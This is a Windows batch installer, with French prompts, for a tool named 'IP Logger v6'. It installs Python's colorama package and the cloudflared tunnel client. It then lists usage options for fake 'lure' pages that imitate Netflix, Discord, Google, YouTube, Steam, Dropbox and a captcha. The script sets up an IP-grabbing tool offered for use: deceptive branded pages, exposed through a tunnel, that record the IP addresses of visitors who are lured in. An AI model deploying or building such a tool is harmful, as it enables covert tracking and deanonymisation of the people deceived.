@echo off
title IP Logger v6 - Installer
color 0B
echo.
echo  ========================================
echo   IP Logger v6  --  Installer
echo  ========================================
echo.

:: Python
python --version >nul 2>&1
if not errorlevel 1 (
    echo  [*] Installation de colorama...
    python -m pip install colorama --quiet
)
if errorlevel 1 (
    echo  [!] Python non trouve.
    echo      Telecharge : https://www.python.org/downloads/
    pause & exit /b 1
)
echo  [OK] Python detecte

:: cloudflared
cloudflared --version >nul 2>&1
if errorlevel 1 (
    echo  [*] Installation de cloudflared via winget...
    winget install Cloudflare.cloudflared --source winget --silent
    cloudflared --version >nul 2>&1
    if errorlevel 1 (
        echo  [*] winget echoue, telechargement direct...
        curl -L -o "%~dp0cloudflared.exe" "https://github.com/cloudflare/cloudflared/releases/latest/download/cloudflared-windows-amd64.exe"
        if exist "%~dp0cloudflared.exe" (
            echo  [OK] cloudflared.exe telecharge dans le dossier
            set PATH=%PATH%;%~dp0
        ) else (
            echo  [!] Echec. Installe manuellement depuis :
            echo      https://github.com/cloudflare/cloudflared/releases/latest
        )
    ) else (
        echo  [OK] cloudflared installe via winget
    )
) else (
    echo  [OK] cloudflared detecte
)

echo.
echo  ========================================
echo   Installation terminee !
echo  ========================================
echo.
echo  Usage :
echo    python ip_logger.py
echo    python ip_logger.py --lure netflix
echo    python ip_logger.py --lure discord --secret tontoken
echo    python ip_logger.py --no-tunnel --lure captcha
echo.
echo  Pages disponibles :
echo    captcha  google  discord  youtube
echo    twitch   netflix  steam  dropbox  404
echo.
pause
